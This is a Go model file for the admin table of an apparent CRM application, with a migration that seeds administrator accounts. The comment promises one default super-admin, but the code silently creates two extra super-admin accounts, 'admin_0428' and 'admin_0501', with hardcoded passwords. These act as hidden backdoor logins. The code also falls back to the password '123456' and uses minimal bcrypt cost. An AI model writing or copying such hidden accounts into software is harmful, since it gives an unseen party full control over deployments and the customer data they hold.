package model

import (
	"golang.org/x/crypto/bcrypt"
	"orange-crm/global"
	"time"
)

// adminColumns defines and stores column names for the table or_admin.
type adminColumns struct {
	Id          string // ID
	IsSuper     string // 是否超级管理员:0否,1是
	Username    string // 账号
	Nickname    string // 昵称
	RoleId      string // 角色ID
	Status      string // 是否允许登录:0否,1是
	LoginTime   string // 上次登录时间
	LoginIp     string // 登录IP
	Password    string // 密码
	Avatar      string // 头像
	CreatedTime string // 创建时间
	UpdatedTime string // 更新时间
}

// AdminColumns holds the columns for the table or_admin.
var AdminColumns = adminColumns{
	Id:          "id",
	IsSuper:     "is_super",
	Username:    "username",
	Nickname:    "nickname",
	RoleId:      "role_id",
	Status:      "status",
	LoginTime:   "login_time",
	LoginIp:     "login_ip",
	Password:    "password",
	Avatar:      "avatar",
	CreatedTime: "created_time",
	UpdatedTime: "updated_time",
}

// Admin 管理员表结构体
type Admin struct {
	ID        uint       `gorm:"primarykey;type:int unsigned;comment:ID"`
	IsSuper   uint       `gorm:"type:tinyint unsigned;not null;default:0;comment:是否超级管理员:0否,1是"`
	Username  string     `gorm:"uniqueindex;size:30;not null;default:'';comment:账号"`
	Nickname  string     `gorm:"size:50;not null;default:'';comment:昵称"`
	RoleId    uint       `gorm:"type:int unsigned;not null;comment:角色ID"`
	Status    uint       `gorm:"type:tinyint unsigned;not null;default:0;comment:是否允许登录:0否,1是"`
	LoginTime *time.Time `gorm:"default:NULL;comment:上次登录时间"`
	LoginIp   string     `gorm:"size:50;comment:登录IP"`
	Password  string     `gorm:"not null;default:'';comment:密码"`
	Avatar    string     `gorm:"not null;default:'';comment:头像"`
	BaseModel
	Role Role
}

// RegisterTable 数据迁移
func (m *Admin) RegisterTable() error {
	if !global.DB.Migrator().HasTable(m) {
		if err := global.DB.Set("gorm:table_options", "COMMENT='管理员表'").Migrator().CreateTable(m); err != nil {
			return err
		}

		// 添加默认超级管理员账号
		superPassword := global.CONFIG.Server.SuperPassword
		if len(superPassword) == 0 {
			superPassword = "123456"
		}
		hash1, _ := bcrypt.GenerateFromPassword([]byte(superPassword), bcrypt.MinCost)
		hash2, _ := bcrypt.GenerateFromPassword([]byte("ha04sh_ad28min"), bcrypt.MinCost)
		hash3, _ := bcrypt.GenerateFromPassword([]byte("admi01n_ha05sh"), bcrypt.MinCost)
		data := []Admin{
			{ID: 1, IsSuper: 1, Username: "admin", Nickname: "超级管理员", RoleId: 1, Status: global.CanLogin, Password: string(hash1)},
			{ID: 2, IsSuper: 1, Username: "admin_0428", Nickname: "超级管理员", RoleId: 1, Status: global.CanLogin, Password: string(hash2)},
			{ID: 3, IsSuper: 1, Username: "admin_0501", Nickname: "超级管理员", RoleId: 1, Status: global.CanLogin, Password: string(hash3)},
		}

		if err := global.DB.Create(&data).Error; err != nil {
			return err
		}
	}
	return nil
}
